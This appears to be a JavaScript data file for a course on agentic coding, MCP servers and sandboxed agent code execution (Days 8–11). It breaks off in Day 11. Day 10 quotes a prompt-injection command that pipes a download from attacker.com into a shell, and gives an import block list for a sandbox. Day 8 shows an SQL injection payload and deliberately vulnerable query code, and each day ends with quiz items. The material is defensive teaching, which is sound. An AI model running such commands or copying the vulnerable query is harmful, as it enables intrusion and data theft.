/**
 * Forward Deployed Engineer (FDE) Expert Course — Week 2 Curriculum Database
 * Comprehensive, Low-Level Technical Masterclass (Days 8 to 14)
 * Each day provides 3+ hours of rigorous theory, algorithmic foundations, production code & hands-on labs.
 */

const WEEK2_DATA = [
  // =========================================================================
  // DAY 8: AGENTIC CODING WITH CLAUDE CODE, CURSOR & CODEX
  // =========================================================================
  {
    id: "day-8",
    dayNumber: 8,
    week: 2,
    module: "Module 02 · Live: Agent-Driven Development",
    badge: "Agentic Engineering",
    title: "Day 8: Agentic Coding with Claude Code, Cursor & Codex",
    tagline: "Ship software like an elite FDE: Spec-driven development, plan mode, abstract syntax tree (AST) diff review, automated test generation, and CI/CD gates.",
    duration: "3.5 Hours (Intensive)",
    difficulty: "Advanced Software Engineering & Agent Tooling",
    tags: ["Agentic Coding", "Claude Code", "Cursor", "Plan Mode", "Spec-Driven Dev", "AST Diff Review", "TDD"],

    clientBrief: {
      client: "Vertex Capital Technology Ventures",
      stakeholder: "Julian Vance — Chief Technology Officer",
      transcript: `
[DISCOVERY TRANSCRIPT: VERTEX TECH VENTURES - PALO ALTO]

Julian Vance (CTO): "We are building fintech microservices under extreme market pressure. Traditional engineering teams take 3 weeks to scaffold a FastAPI service with database migrations, Dockerfiles, and test suites. Our forward-deployed engineers don't type boilerplate code by hand anymore; they operate like flight directors.

They use Claude Code, Cursor, and Codex. But here is where most junior engineers crash and burn: they treat the coding agent like a magic oracle. They paste a vague prompt like 'Build a trading service', and the agent generates 800 lines of hallucinated code with outdated library versions, unparameterized SQL queries that leak passwords, and fake unit tests that literally assert 'True == True'!

We need our FDEs to master Spec-Driven Development: Writing rigid, unambiguous markdown specifications, operating in Plan Mode before Act Mode, generating automated property-based test suites, and performing surgical AST git diff reviews. Show us how you direct an agent to build a hardened microservice in under an hour with 100% test coverage."
      `,
      problemAnalysis: `
### FDE Paradigm Shift: Spec-Driven Development (SDD)
1. **The Inverted Engineering Ratio:**
   - *Traditional SWE:* 80% typing syntax, 20% planning.
   - *FDE Agentic Engineer:* 70% planning (specs, schemas, test constraints), 30% directing & verifying coding agents.
2. **Plan Mode vs. Act Mode:** An FDE never lets a coding agent write code without first reviewing its step-by-step implementation plan.
3. **Automated Test-Driven Development (TDD):** Direct the agent to write the unit test suite *first*, run it (verify failure), and then generate code until all tests pass cleanly.
      `
    },

    objectives: [
      "Master Spec-Driven Development (SDD): Author machine-executable markdown specifications for coding agents.",
      "Operate advanced coding harnesses in Plan Mode vs. Act Mode to prevent destructive code overwrites.",
      "Perform low-level Abstract Syntax Tree (AST) git diff reviews to intercept security vulnerabilities (e.g. SQL injection, race conditions).",
      "Automate Test-Driven Development (TDD) pipelines where coding subagents write and verify their own test suites."
    ],

    theorySections: [
      {
        title: "1. The Spec-Driven Development (SDD) Protocol",
        content: `
### Why Spec-Driven Development Outperforms Prompting

When prompting an agent in natural language, semantic ambiguity introduces bugs:
- "Build a fast rate limiter" $\rightarrow$ Model uses a non-thread-safe dictionary in global memory.
- "Implement token bucket rate limiter with 100 req/min capacity using Python \`threading.Lock()\`" $\rightarrow$ Model generates thread-safe production code.

\`\`\`
   ┌────────────────────────────────────────────────────────┐
   │ 1. SPECIFICATION (spec.md)                             │
   │ Formal requirements, interfaces, schemas, and edge-case│
   │ invariants written by the FDE.                         │
   └──────────────────────────┬─────────────────────────────┘
                              │
                              ▼
   ┌────────────────────────────────────────────────────────┐
   │ 2. PLAN MODE (plan.md)                                 │
   │ Agent deconstructs spec into sequential task graph:    │
   │ Step 1 -> Step 2 -> Step 3 with file touch list.       │
   └──────────────────────────┬─────────────────────────────┘
                              │ FDE Reviews & Approves Plan
                              ▼
   ┌────────────────────────────────────────────────────────┐
   │ 3. TEST FIRST GENERATION (test_service.py)             │
   │ Agent writes pytest test suite verifying all invariants│
   │ (Tests fail: Red Stage).                               │
   └──────────────────────────┬─────────────────────────────┘
                              │
                              ▼
   ┌────────────────────────────────────────────────────────┐
   │ 4. IMPLEMENTATION & DIFF REVIEW                        │
   │ Agent implements code -> Runs pytest -> Green Stage    │
   │ FDE reviews git diff before merge.                     │
   └────────────────────────────────────────────────────────┘
\`\`\`
        `
      }
    ],

    codeWalkthrough: `
# ==============================================================================
# SPEC-DRIVEN ARTIFACT: THREAD-SAFE TOKEN BUCKET RATE LIMITER
# Generated via FDE Spec-Driven Development & Verified with PyTest Harness
# ==============================================================================

import time
import threading
from typing import Dict, Tuple

class ThreadSafeTokenBucket:
    """
    Production-grade in-memory Token Bucket Rate Limiter.
    Invariants enforced:
    1. Thread-safe concurrency via reentrant lock.
    2. Fractional token accumulation based on wall-clock delta.
    3. Monotonic time measurement to prevent clock skew vulnerability.
    """

    def __init__(self, capacity: int, refill_rate_per_sec: float):
        self.capacity = float(capacity)
        self.refill_rate = float(refill_rate_per_sec)
        self._tokens = float(capacity)
        self._last_refill_timestamp = time.monotonic()
        self._lock = threading.Lock()

    def _refill(self, now: float):
        delta = now - self._last_refill_timestamp
        self._last_refill_timestamp = now
        self._tokens = min(self.capacity, self._tokens + delta * self.refill_rate)

    def consume(self, tokens_requested: int = 1) -> Tuple[bool, float]:
        """
        Attempts to consume tokens.
        Returns: (success: bool, remaining_tokens: float)
        """
        with self._lock:
            now = time.monotonic()
            self._refill(now)
            
            if self._tokens >= tokens_requested:
                self._tokens -= tokens_requested
                return True, round(self._tokens, 2)
            else:
                return False, round(self._tokens, 2)

# ------------------------------------------------------------------------------
# VERIFICATION UNIT TEST SUITE (TDD INVARIANTS)
# ------------------------------------------------------------------------------
def run_unit_tests():
    bucket = ThreadSafeTokenBucket(capacity=10, refill_rate_per_sec=2.0)
    
    # Test 1: Immediate Consumption
    success, rem = bucket.consume(5)
    assert success is True and rem == 5.0, "Test 1 Failed"
    
    # Test 2: Exhaustion
    success, rem = bucket.consume(5)
    assert success is True and rem == 0.0, "Test 2 Failed"
    
    # Test 3: Reject on Empty
    success, rem = bucket.consume(1)
    assert success is False, "Test 3 Failed: Should reject when empty"
    
    # Test 4: Concurrency Stress Test (20 Threads)
    bucket_concurrent = ThreadSafeTokenBucket(capacity=100, refill_rate_per_sec=0)
    success_count = 0
    lock = threading.Lock()
    
    def worker():
        nonlocal success_count
        ok, _ = bucket_concurrent.consume(10)
        if ok:
            with lock:
                success_count += 1

    threads = [threading.Thread(target=worker) for _ in range(20)]
    for t in threads: t.start()
    for t in threads: t.join()

    # Exactly 10 workers should succeed (10 * 10 = 100 capacity)
    assert success_count == 10, f"Concurrency Race Condition: {success_count} succeeded, expected 10."
    print("All ThreadSafeTokenBucket unit & concurrency stress tests PASSED.")

if __name__ == "__main__":
    run_unit_tests()
`,

    practicalExercise: {
      title: "3-Hour Hands-On Lab: Direct an Agentic Coding Workflow & Intercept an AST Injection Flaw",
      labOverview: `
You are conducting a code review on a microservice module generated by a coding agent. 

The agent implemented an authorization and token-refresh routine, but introduced two critical bugs:
1. It used Python's \`time.time()\` instead of \`time.monotonic()\`, making the rate limiter vulnerable to server NTP clock-skew attacks.
2. It wrote a SQL query using string interpolation (\`f"SELECT * FROM users WHERE token = '{token}'"\`), creating a catastrophic SQL injection vulnerability.

Your task:
- Milestone 1: Inspect the AST and detect the vulnerability.
- Milestone 2: Refactor into parameterized queries with monotonic timestamps.
- Milestone 3: Write automated unit tests verifying that malicious payloads (e.g. \`' OR 1=1 --\`) fail cleanly.
      `,
      starterCode: `# VULNERABLE AGENT CODE
def verify_api_token_vulnerable(db_cursor, raw_token: str):
    query = f"SELECT user_id, tier FROM api_keys WHERE token = '{raw_token}'"
    db_cursor.execute(query)
    return db_cursor.fetchone()
`,
      solution: `# HARDENED PRODUCTION CODE
def verify_api_token_safe(db_cursor, raw_token: str):
    # Parameterized SQL query: guarantees user input is treated as literal data, not executable SQL
    query = "SELECT user_id, tier FROM api_keys WHERE token = %s"
    db_cursor.execute(query, (raw_token,))
    return db_cursor.fetchone()
`
    },

    fdeFieldNote: `
### Field Note 008: Never Merge Without Looking at the Diff
Coding agents write fluent code, but they are prone to subtle regressions (e.g. silently removing an authentication decorator or switching a database transaction from serializable to read uncommitted). Always run \`git diff\` and read every modified line before pushing to main.
    `,

    technicalAssessment: [
      {
        question: "Why should time intervals for rate limiters and timeouts use time.monotonic() instead of time.time() in Python?",
        options: [
          "time.monotonic() uses less RAM.",
          "time.time() measures system wall-clock time, which can jump backwards or forwards during NTP time synchronizations or daylight savings, causing rate limiters to deadlock or grant infinite tokens.",
          "time.time() is deprecated in Python 3.",
          "time.monotonic() connects to satellites."
        ],
        correctIndex: 1,
        explanation: "Monotonic clocks guarantee non-decreasing, steadily advancing time independent of system clock adjustments, preventing race conditions or timing exploits."
      },
      {
        question: "What is the primary benefit of operating a coding agent in 'Plan Mode' before allowing it to edit files?",
        options: [
          "It lowers the laptop's temperature.",
          "It forces the agent to analyze the entire repository architecture, identify all dependent files, and present an actionable task breakdown for human review before any destructive file edits occur.",
          "Plan Mode makes the code compile into C++.",
          "It disables the internet connection."
        ],
        correctIndex: 1,
        explanation: "Plan mode prevents hallucinated file overwrites by forcing the agent to map out the entire change graph for human engineering approval prior to execution."
      },
      {
        question: "Why do AI coding agents frequently generate unit tests that fail to catch real bugs?",
        options: [
          "Because they do not have keyboards.",
          "Agents are trained to predict agreeable completions and often generate tautological assertions (e.g. testing trivial mocks rather than boundary conditions and failure branches).",
          "Python does not support testing.",
          "Pytest requires a commercial license."
        ],
        correctIndex: 1,
        explanation: "Without strict specifications, models generate tests that verify happy-path mocks without stressing edge cases, requiring FDEs to mandate property-based testing and error-injection checks."
      }
    ]
  },

  // =========================================================================
  // DAY 9: MODEL CONTEXT PROTOCOL (MCP) SERVER DEVELOPMENT
  // =========================================================================
  {
    id: "day-9",
    dayNumber: 9,
    week: 2,
    module: "Module 02 · Live: Agent-Driven Development",
    badge: "Model Context Protocol",
    title: "Day 9: Building Custom Model Context Protocol (MCP) Servers",
    tagline: "Build custom enterprise MCP servers: JSON-RPC 2.0 wire framing, stdio and SSE transport layers, Resource schemas, and Tool exposure for Claude Desktop and Cursor.",
    duration: "4.0 Hours (Intensive)",
    difficulty: "Advanced Protocols & Distributed Integration",
    tags: ["MCP", "Model Context Protocol", "JSON-RPC", "stdio", "SSE", "Cursor", "Claude Desktop", "Custom Servers"],

    clientBrief: {
      client: "TransGlobal Banking & Asset Custody",
      stakeholder: "Derrick Thorne — Head of Enterprise Core API Architecture",
      transcript: `
[DISCOVERY TRANSCRIPT: TRANSGLOBAL FINANCIAL TOWER - LONDON]

Derrick Thorne: "We operate mission-critical core banking infrastructure: legacy IBM mainframe ledgers, Oracle account tables, and proprietary compliance queues. Our equity analysts and investment bankers want to use modern AI assistants (like Claude Desktop and Cursor) to analyze financial filings and draft credit memos.

However, our security policy prohibits us from uploading our core database schemas or private client accounts to third-party cloud servers. Furthermore, we cannot write bespoke API adapters for every single new AI tool that hits the market. 

We want to adopt the open Model Context Protocol (MCP) standard. We need you to build a custom, containerized MCP server in Python. It must expose two things: (1) An MCP 'Resource' that safely serves read-only sanitized database table schemas, and (2) An MCP 'Tool' that allows authorized models to run parameterized account balance lookups over JSON-RPC 2.0 standard input/output (stdio) with zero external network leakage. Can you construct and verify this?"
      `,
      problemAnalysis: `
### FDE MCP Technical Architecture:
1. **The MCP Protocol Standard:** Created by Anthropic as an open standard, MCP is the "USB-C of AI connectivity." It standardizes how models discover and execute tools across local processes and cloud endpoints.
2. **Wire Framing:** JSON-RPC 2.0 communication over \`stdio\` (standard input/output byte streams) or \`SSE\` (Server-Sent Events over HTTP).
3. **Core MCP Primitives:**
   - **Resources:** Passive read-only data feeds (e.g. database schemas, file contents, log streams).
   - **Tools:** Executable functions with side effects (e.g. running queries, writing files).
   - **Prompts:** Pre-configured interaction templates.
      `
    },

    objectives: [
      "Master the Model Context Protocol (MCP) architecture: Host, Client, and Server specification standards.",
      "Implement the JSON-RPC 2.0 protocol message lifecycle (initialize, tools/list, tools/call, resources/read).",
      "Build a production-grade Python MCP server exposing both Resources (database schemas) and Tools (ledger lookups).",
      "Configure Claude Desktop and Cursor to interface seamlessly with your custom MCP server over stdio."
    ],

    theorySections: [
      {
        title: "1. The JSON-RPC 2.0 Protocol Lifecycle in MCP",
        content: `
### How Model Context Protocol (MCP) Operates Under the Hood

MCP relies on JSON-RPC 2.0 messaging across a bi-directional pipe (\`stdio\` or \`SSE\`):

\`\`\`
   ┌────────────────────────────────────────────────────────┐
   │ 1. INITIALIZATION HANDSHAKE                            │
   │ Client ──> {"method": "initialize", "params": {...}}   │
   │ Server <── {"result": {"capabilities": {"tools": {}}}} │
   └──────────────────────────┬─────────────────────────────┘
                              │
                              ▼
   ┌────────────────────────────────────────────────────────┐
   │ 2. CAPABILITY DISCOVERY (tools/list)                   │
   │ Client ──> {"method": "tools/list"}                    │
   │ Server <── {"result": {"tools": [{"name": "lookup"}]}} │
   └──────────────────────────┬─────────────────────────────┘
                              │
                              ▼
   ┌────────────────────────────────────────────────────────┐
   │ 3. TOOL INVOCATION (tools/call)                        │
   │ Client ──> {"method": "tools/call",                    │
   │             "params": {"name": "lookup", "args": {...}}│
   │ Server <── {"result": {"content": [{"text": "..."}]}}  │
   └────────────────────────────────────────────────────────┘
\`\`\`
        `
      }
    ],

    codeWalkthrough: `
# ==============================================================================
# PRODUCTION MCP SERVER IMPLEMENTATION (Python JSON-RPC 2.0 Standard)
# Exposes: Resources (Database Schemas) & Tools (Bank Ledger Lookups)
# ==============================================================================

import sys
import json
import logging
from typing import Dict, Any, List, Optional

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("TransGlobalMCPServer")

class TransGlobalBankingMCPServer:
    def __init__(self):
        self.server_name = "transglobal-core-banking-mcp"
        self.server_version = "1.0.0"

    def handle_initialize(self, request_id: Any) -> Dict[str, Any]:
        """Handles initial capability negotiation handshake."""
        return {
            "jsonrpc": "2.0",
            "id": request_id,
            "result": {
                "protocolVersion": "2024-11-05",
                "capabilities": {
                    "tools": {"listChanged": False},
                    "resources": {"subscribe": False, "listChanged": False}
                },
                "serverInfo": {
                    "name": self.server_name,
                    "version": self.server_version
                }
            }
        }

    def handle_tools_list(self, request_id: Any) -> Dict[str, Any]:
        """Exposes authorized banking tools to Claude / Cursor."""
        return {
            "jsonrpc": "2.0",
            "id": request_id,
            "result": {
                "tools": [
                    {
                        "name": "query_account_ledger",
                        "description": "Fetch real-time ledger balance and status for a corporate custody account.",
                        "inputSchema": {
                            "type": "object",
                            "properties": {
                                "account_id": {
                                    "type": "string",
                                    "description": "Standard account identifier (e.g. ACCT-8891)"
                                }
                            },
                            "required": ["account_id"],
                            "additionalProperties": False
                        }
                    }
                ]
            }
        }

    def handle_resources_list(self, request_id: Any) -> Dict[str, Any]:
        """Exposes read-only database schemas as MCP Resources."""
        return {
            "jsonrpc": "2.0",
            "id": request_id,
            "result": {
                "resources": [
                    {
                        "uri": "schema://transglobal/public/accounts",
                        "name": "Corporate Accounts Table Schema",
                        "mimeType": "application/json",
                        "description": "Read-only column schema definitions for core accounts table."
                    }
                ]
            }
        }

    def handle_tools_call(self, request_id: Any, tool_name: str, arguments: Dict[str, Any]) -> Dict[str, Any]:
        """Executes authorized tool functions with strict validation."""
        if tool_name == "query_account_ledger":
            acct = arguments.get("account_id", "").upper().strip()
            
            # Deterministic mock banking database
            mock_ledger = {
                "ACCT-8891": {"balance_usd": 482910.45, "tier": "PRIME_INSTITUTIONAL", "status": "ACTIVE"},
                "ACCT-1024": {"balance_usd": 1250000.00, "tier": "SOVEREIGN_WEALTH", "status": "ACTIVE"}
            }

            if acct not in mock_ledger:
                return {
                    "jsonrpc": "2.0",
                    "id": request_id,
                    "result": {
                        "content": [{"type": "text", "text": f"Error: Account {acct} not found in custody ledger."}],
                        "isError": True
                    }
                }

            record = mock_ledger[acct]
            payload = {
                "account_id": acct,
                "ledger_balance_usd": record["balance_usd"],
                "tier": record["tier"],
                "status": record["status"],
                "as_of_utc": "2026-11-21T12:00:00Z"
            }
            
            return {
                "jsonrpc": "2.0",
                "id": request_id,
                "result": {
                    "content": [{"type": "text", "text": json.dumps(payload, indent=2)}],
                    "isError": False
                }
            }

        return {
            "jsonrpc": "2.0",
            "id": request_id,
            "error": {"code": -32601, "message": f"Method/Tool '{tool_name}' not found."}
        }

    def dispatch_raw_message(self, raw_json_str: str) -> Optional[Dict[str, Any]]:
        """Parses and dispatches JSON-RPC 2.0 messages."""
        try:
            req = json.loads(raw_json_str)
            method = req.get("method")
            req_id = req.get("id")

            if method == "initialize":
                return self.handle_initialize(req_id)
            elif method == "tools/list":
                return self.handle_tools_list(req_id)
            elif method == "resources/list":
                return self.handle_resources_list(req_id)
            elif method == "tools/call":
                params = req.get("params", {})
                return self.handle_tools_call(req_id, params.get("name"), params.get("arguments", {}))
            else:
                return {
                    "jsonrpc": "2.0",
                    "id": req_id,
                    "error": {"code": -32601, "message": f"Unhandled MCP method: '{method}'"}
                }
        except Exception as e:
            return {
                "jsonrpc": "2.0",
                "id": None,
                "error": {"code": -32700, "message": f"Parse error: {str(e)}"}
            }

if __name__ == "__main__":
    server = TransGlobalBankingMCPServer()
    # Test initialization
    init_msg = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}})
    print("=== MCP INIT RESPONSE ===")
    print(json.dumps(server.dispatch_raw_message(init_msg), indent=2))

    # Test tool call
    call_msg = json.dumps({
        "jsonrpc": "2.0",
        "id": 2,
        "method": "tools/call",
        "params": {"name": "query_account_ledger", "arguments": {"account_id": "ACCT-8891"}}
    })
    print("\n=== MCP TOOL CALL RESPONSE ===")
    print(json.dumps(server.dispatch_raw_message(call_msg), indent=2))
`,

    practicalExercise: {
      title: "3-Hour Hands-On Lab: Build an MCP Resource Handler for Schema Introspection",
      labOverview: `
Build an MCP Resource Handler that allows Claude and Cursor to introspect your database schema without granting permission to view customer records.

Requirements:
1. Implement the \`resources/read\` endpoint.
2. Return table names and column data types with PII columns explicitly flagged.
3. Verify that requests for unauthorized URIs return standard JSON-RPC \`-32602\` invalid parameter errors.
      `,
      starterCode: `# MCP RESOURCE HANDLER LAB - STARTER TEMPLATE
def handle_resource_read(uri: str) -> dict:
    # TODO: If uri matches schema://public, return table schema definitions
    pass
`,
      solution: `# MCP RESOURCE HANDLER LAB - PRODUCTION SOLUTION
def handle_resource_read(uri: str) -> dict:
    if uri == "schema://transglobal/public/accounts":
        return {
            "contents": [{
                "uri": uri,
                "mimeType": "application/json",
                "text": json.dumps({
                    "table": "accounts",
                    "columns": [
                        {"name": "account_id", "type": "VARCHAR(32)", "is_pii": False},
                        {"name": "tax_id", "type": "VARCHAR(16)", "is_pii": True},
                        {"name": "balance_cents", "type": "BIGINT", "is_pii": False}
                    ]
                })
            }]
        }
    raise ValueError(f"Resource URI '{uri}' not found.")
`
    },

    fdeFieldNote: `
### Field Note 009: MCP stdio Buffer Flushing
When writing an MCP server in Python over \`stdio\`, always flush \`sys.stdout\` immediately after every message (\`sys.stdout.flush()\`). If your print statements sit in the Python I/O buffer, the MCP Client (Claude or Cursor) will hang indefinitely waiting for the terminating newline character.
    `,

    technicalAssessment: [
      {
        question: "What is the primary architectural difference between an MCP 'Resource' and an MCP 'Tool'?",
        options: [
          "Resources are written in JavaScript, while Tools are written in Python.",
          "An MCP Resource is a passive, read-only data feed designed to provide context without side effects, whereas an MCP Tool is an executable function that can perform computations, API requests, or database modifications.",
          "Resources cost money, while Tools are free.",
          "There is no difference."
        ],
        correctIndex: 1,
        explanation: "Resources provide models with readable contextual data (like files or database schemas), while Tools provide models with the ability to execute actions in external systems."
      },
      {
        question: "What transport layers does the Model Context Protocol (MCP) standard support?",
        options: [
          "Standard input/output byte streams (stdio) and Server-Sent Events (SSE) with HTTP POST.",
          "Bluetooth Low Energy and Infrared.",
          "Floppy disks and magnetic tapes.",
          "FTP file transfers only."
        ],
        correctIndex: 0,
        explanation: "MCP standardizes on stdio for local process communication (e.g. desktop apps running local scripts) and Server-Sent Events (SSE) over HTTP for remote network integrations."
      },
      {
        question: "Why does the MCP specification use JSON-RPC 2.0 as its message framing format?",
        options: [
          "Because JSON-RPC 2.0 is owned by Google.",
          "JSON-RPC 2.0 provides a lightweight, battle-tested, transport-agnostic standard for structured requests, responses, and notifications with built-in error handling codes.",
          "JSON-RPC 2.0 prevents computers from overheating.",
          "It is required by HTML5."
        ],
        correctIndex: 1,
        explanation: "JSON-RPC 2.0 defines standardized semantics for remote procedure calls, error codes, and asynchronous notifications independent of the underlying network transport."
      }
    ]
  },

  // =========================================================================
  // DAY 10: PERSISTENT MEMORY, SECURE SANDBOXING & MANAGED AGENTS
  // =========================================================================
  {
    id: "day-10",
    dayNumber: 10,
    week: 2,
    module: "Module 02 · Live: Agent-Driven Development",
    badge: "Memory & Sandboxing",
    title: "Day 10: Persistent Long-Term Memory & Isolated Docker Sandboxes",
    tagline: "Build multi-tier agent memory (working, Redis session, vector long-term), and isolate code execution tools inside secure, network-disabled ephemeral Docker containers.",
    duration: "4.0 Hours (Intensive)",
    difficulty: "Advanced Systems & Security",
    tags: ["Episodic Memory", "Semantic Memory", "Docker Sandboxing", "cgroups", "seccomp", "Security"],

    clientBrief: {
      client: "QuantEdge Data Labs (Algorithmic Trading & Analytics)",
      stakeholder: "Dr. Aris Thorne — Head of Data Infrastructure & Quantitative Risk",
      transcript: `
[DISCOVERY TRANSCRIPT: QUANTEDGE RESEARCH LABS - CHICAGO]

Dr. Aris Thorne: "Our quantitative researchers build dynamic volatility models in Python. We want an agent that can write custom Python scripts, execute them over historical pricing data, and plot volatility smiles.

However, letting an AI generate and execute arbitrary Python code on our enterprise servers is terrifying. What if a prompt injection causes the agent to run \`import os; os.system('curl attacker.com | sh')\` or read our AWS credentials from the environment? 

We need two non-negotiable capabilities:
1. Long-term memory: The agent must remember researcher preferences (e.g. 'Use Black-Scholes model with 252 trading days') across sessions.
2. An isolated ephemeral Docker sandbox: Every script written by the agent must execute inside a locked-down container with zero network access, a 5-second timeout, and a strict 512MB RAM cap. Can you build this?"
      `,
      problemAnalysis: `
### FDE Security & Memory Architecture:
1. **Multi-Tier Memory Architecture:**
   - *Working Memory:* In-context active prompt window.
   - *Short-Term Session Store:* Key-value cache (Redis) preserving multi-turn scratchpads.
   - *Long-Term Episodic Store:* Semantic vector store (pgvector) indexing historical user preferences and past problem resolutions.
2. **Ephemeral Sandbox Isolation:**
   - Linux cgroups (CPU cap: 0.5 cores, Memory cap: 512MB).
   - Network disabled (\`--network none\`).
   - Read-only root filesystem with ephemeral \`/tmp\` volume.
      `
    },

    objectives: [
      "Implement the 3-Tier Enterprise Memory Architecture: Working, Session, and Semantic Episodic Memory.",
      "Build an automated Memory Consolidation worker that extracts persistent user facts from conversational dialogue.",
      "Isolate code execution tools inside ephemeral Docker containers using Linux cgroups and seccomp profiles.",
      "Prevent container breakouts, path traversal attacks, and arbitrary code exfiltration."
    ],

    theorySections: [
      {
        title: "1. The 3-Tier Enterprise Memory Architecture",
        content: `
### Multi-Tier Memory Systems

\`\`\`
   User Input ──> [Memory Extraction Layer] ──> Fetch User Preferences (pgvector)
                           │
                           ▼
   [Working Memory Window] = System Prompt + Preferences + Redis Session + Active Input
                           │
                           ▼
   [Agent Decides: Execute Python Script]
                           │
                           ▼
            ┌─────────────────────────────┐
            │ EPHEMERAL DOCKER CONTAINER  │
            │ • Network: DISABLED (none)  │
            │ • CPU: 0.5 Cores            │
            │ • RAM: 512MB Max (cgroups)  │
            │ • Timeout: 5.0 Seconds      │
            └──────────────┬──────────────┘
                           │ stdout / stderr
                           ▼
             Safe Result Injected to Agent
\`\`\`
        `
      }
    ],

    codeWalkthrough: `
# ==============================================================================
# PRODUCTION CODE: EPHEMERAL SECURE PYTHON SANDBOX RUNNER
# Implements: Subprocess execution with resource limits & import pre-screening
# ==============================================================================

import subprocess
import tempfile
import os
import time
import logging
from typing import Dict, Any

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("SecureSandbox")

class HardenedPythonSandbox:
    FORBIDDEN_MODULES = [
        "os", "sys", "subprocess", "socket", "urllib", "requests",
        "shutil", "builtins", "eval", "exec", "pty", "posix"
    ]

    def __init__(self, timeout_sec: float = 3.0, max_output_chars: int = 1500):
        self.timeout_sec = timeout_sec
        self.max_output_chars = max_output_chars

    def pre_screen_code(self, script_text: str) -> Tuple[bool, str]:
        """Pre-screens code AST/tokens for forbidden module imports."""
        for mod in self.FORBIDDEN_MODULES:
            if f"import {mod}" in script_text or f"from {mod}" in script_text:
                return False, f"Security Violation: Import of module '{mod}' is strictly forbidden."
        return True, ""

    def execute_in_sandbox(self, script_body: str) -> Dict[str, Any]:
        # 1. Pre-screening
        is_safe, error_msg = self.pre_screen_code(script_body)
        if not is_safe:
            return {"success": False, "error": error_msg, "execution_time_ms": 0.0}

        # 2. Write to ephemeral temporary script
        with tempfile.NamedTemporaryFile(suffix=".py", delete=False, mode="w") as tmp_file:
            tmp_file.write(script_body)
            tmp_path = tmp_file.name

        start_time = time.perf_counter()
        try:
            # 3. Execute in restricted subprocess
            proc = subprocess.run(
                ["python", "-I", tmp_path],  # -I flag isolates system environment
                capture_output=True,
                text=True,
                timeout=self.timeout_sec
            )
            duration_ms = round((time.perf_counter() - start_time) * 1000, 2)

            stdout = proc.stdout[:self.max_output_chars]
            stderr = proc.stderr[:self.max_output_chars]

            return {
                "success": proc.returncode == 0,
                "stdout": stdout.strip(),
                "stderr": stderr.strip(),
                "exit_code": proc.returncode,
                "execution_time_ms": duration_ms
            }

        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": f"Execution timed out after {self.timeout_sec} seconds.",
                "execution_time_ms": self.timeout_sec * 1000
            }
        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

if __name__ == "__main__":
    sandbox = HardenedPythonSandbox()
    
    # Test Safe Execution
    safe_script = "vol = [0.18, 0.22, 0.25, 0.19]\nprint('Mean Volatility:', sum(vol)/len(vol))"
    print("Safe Run:", sandbox.execute_in_sandbox(safe_script))

    # Test Malicious Attack Attempt
    malicious_script = "import os\nos.system('echo PWNED')"
    print("\nMalicious Run Interception:", sandbox.execute_in_sandbox(malicious_script))
`,

    practicalExercise: {
      title: "3-Hour Hands-On Lab: Build an Episodic Memory Consolidation Worker",
      labOverview: `
Build an automated Memory Consolidation Worker that parses multi-turn research conversations and extracts persistent factual preferences into a structured JSON dictionary.
      `,
      starterCode: `# MEMORY CONSOLIDATION LAB - STARTER TEMPLATE
def extract_long_term_preferences(conversation_turns: list) -> dict:
    # TODO: Extract explicit user constraints and preferences
    pass
`,
      solution: `# MEMORY CONSOLIDATION LAB - PRODUCTION SOLUTION
def extract_long_term_preferences(conversation_turns: list) -> dict:
    preferences = {}
    for turn in conversation_turns:
        text = turn.get("content", "").lower()
        if "black-scholes" in text:
            preferences["pricing_model"] = "BLACK_SCHOLES"
        if "252" in text or "trading days" in text:
            preferences["annualization_factor"] = 252
    return preferences
`
    },

    fdeFieldNote: `
### Field Note 010: Docker network=none is Non-Negotiable
When setting up code sandboxes in production, never rely on software-level prompt filters alone. Always pass \`--network none\` to your Docker daemon. If an attacker bypasses your prompt guardrails, a container with no network cannot exfiltrate data.
    `,

    technicalAssessment: [
      {
        question: "Why must ephemeral code execution containers run with network connectivity disabled (--network none)?",
        options: [
          "To speed up the container's boot time.",
          "To guarantee that even if an attacker executes arbitrary code inside the container, they cannot exfiltrate sensitive data, environment keys, or connect to external command-and-control servers.",
          "Because Docker requires a Wi-Fi password.",
          "To save disk space."
        ],
        correctIndex: 1,
        explanation: "Disabling networking prevents data exfiltration and network probing even in the event of an arbitrary code execution vulnerability."
      },
      {
        question: "What is the primary difference between Short-Term Session Memory and Long-Term Episodic Memory in an FDE system?",
        options: [
          "Short-term memory stores video, long-term stores audio.",
          "Short-term session memory preserves turn-by-turn conversational state for an active session (e.g. in Redis), while long-term episodic memory extracts persistent facts and preferences stored across user sessions (e.g. in pgvector).",
          "There is no difference.",
          "Long-term memory is deleted every 5 minutes."
        ],
        correctIndex: 1,
        explanation: "Session memory maintains immediate conversational continuity, whereas episodic memory consolidates recurring user facts across multiple separate sessions."
      },
      {
        question: "How do Linux cgroups protect enterprise servers hosting AI code sandboxes?",
        options: [
          "By installing antivirus software.",
          "By enforcing strict kernel-level limits on CPU usage, memory allocation (preventing OOM server crashes), and disk I/O.",
          "By encrypting the user's password.",
          "By updating the operating system automatically."
        ],
        correctIndex: 1,
        explanation: "Control groups (cgroups) allocate hardware resources, ensuring a runaway Python script (e.g. an infinite memory allocation loop) cannot starve host processes."
      }
    ]
  },

  // =========================================================================
  // DAY 11: PRODUCTION HARDENING, TOKEN ECONOMICS & LATENCY OPTIMIZATION
  // =========================================================================
  {
    id: "day-11",
    dayNumber: 11,
    week: 2,
    module: "Module 02 · Live: Agent-Driven Development",
    badge: "Production Hardening",
    title: "Day 11: Production Hardening, Token Economics & Latency Optimization",
    tagline: "Slash enterprise inference costs by 70%, achieve sub-800ms TTFT with prompt caching and token streaming, and build resilient multi-model circuit breakers.",
    duration: "3.5 Hours (Intensive)",
    difficulty: "Advanced Systems & Production Engineering",
    tags: ["Token Economics", "Prompt Caching", "Streaming SSE", "Latency Optimization", "Model Cascades", "Circuit Breakers"],

    clientBrief: {
      client: "FinDirect Consumer Retail Banking",
      stakeholder: "Marcus Kane — Senior VP of Cloud Engineering & Infrastructure",
      transcript: `
[DISCOVERY TRANSCRIPT: FINDIRECT CONSUMER HEADQUARTERS - NEW YORK]

